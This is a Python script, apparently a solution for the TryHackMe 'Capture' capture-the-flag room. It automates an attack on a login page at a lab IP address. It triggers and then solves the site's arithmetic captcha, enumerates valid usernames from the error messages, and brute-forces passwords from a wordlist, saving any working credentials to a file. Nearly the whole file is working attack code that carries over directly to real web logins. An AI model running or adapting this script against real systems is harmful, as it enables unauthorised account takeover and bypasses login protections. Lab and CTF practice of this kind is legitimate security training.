################################################################################
# https://tryhackme.com/room/capture
# Make sure you grab the task files that include passwords.txt and usernames.txt
# Check valid_creds.txt after the script runs
################################################################################

import requests
from bs4 import BeautifulSoup

# This goes directly to <h3>Captcha enabled</h3>
def grab_captcha(soup_object):
	global result
	tag = soup_object.find('h3')
	try:
		captcha = tag.next_element.next_element.next_element.strip()  
		eq_values = captcha.split()
		if eq_values[1] == '+':
			result = int(eq_values[0]) + int(eq_values[2])
		elif eq_values[1] == '-':
			result = int(eq_values[0]) - int(eq_values[2])
		elif eq_values[1] == '*':
			result = int(eq_values[0]) * int(eq_values[2])
		elif eq_values[1] == '/':
			result = int(eq_values[0]) / int(eq_values[2])
		return result
	except AttributeError as e:
		print(f'Error: {e}')

def username_check():
	global result
	end_of_file = False
	with open('usernames.txt', 'r') as usernames_file:
		while not end_of_file:
			for username in usernames_file:
				user = username.strip()
				new_data = {
					'username': user,
					'password': 'password',
					'captcha': result # this is from the first call to the grab_captcha function
				}
				r = requests.post(url, data=new_data)
				
				if 'Invalid captcha' in r.text:
					print('[-] Ugh oh, invalid captcha!')
				elif 'does not exist' in r.text:
					print(f'[-] Invalid username: {user}')
				else:
					print(f'[+] VALID USERNAME: {user}')
					with open('valid_users.txt', 'a') as valid_file:
						valid_file.write(f'{user}\n')
			
				# Calculate the new captcha for the next request
				new_html = r.text
				new_soup = BeautifulSoup(new_html, 'html.parser')
				grab_captcha(new_soup)

			# Break out of the loop after all usernames have been iterated over
			end_of_file = True 
			print('\n--- Checking Passwords ---\n')

def password_check():
	global result
	end_of_file = False
	with open('valid_users.txt', 'r') as valid_users:
		with open('passwords.txt', 'r') as passwords_file:
			while not end_of_file:
				for username in valid_users:
					user = username.strip()
					for password in passwords_file:
						pwd = password.strip()
						new_data = {
							'username': user,
							'password': pwd,
							'captcha': result
						}
						r = requests.post(url, data=new_data)
						
						if 'Invalid captcha' in r.text:
							print('[-] Ugh oh, invalid captcha!')
						elif 'Invalid password' in r.text:
							print(f'[-] Invalid password for {user}: {pwd}')
						else:
							print(f'[+] VALID CREDENTIALS FOUND: {user} : {pwd}')
							with open('valid_creds.txt', 'a') as valid_file:
								valid_file.write(f'{user}:{pwd}\n')
														
						# Calculate the new captcha for the next request
						new_html = r.text
						new_soup = BeautifulSoup(new_html, 'html.parser')
						grab_captcha(new_soup)

					# Break out of the loop after all passwords have been iterated over
					end_of_file = True 
			

if __name__ == "__main__":
	url = 'http://10.10.110.210/login'
	data = {
		'username': 'admin',
		'password': 'admin'
	}

	# Need to make 10 requests to trigger the captcha
	for i in range(10):
		r = requests.post(url, data=data)

	html = r.text
	soup = BeautifulSoup(html, 'html.parser')
	result = 0

	# Grab the initical captcha
	grab_captcha(soup)

	# Check for any valid usernames
	username_check()

	# Check valid usernames against all passwords in list
	password_check()
	print('\n--- Check valid_creds.txt ---')
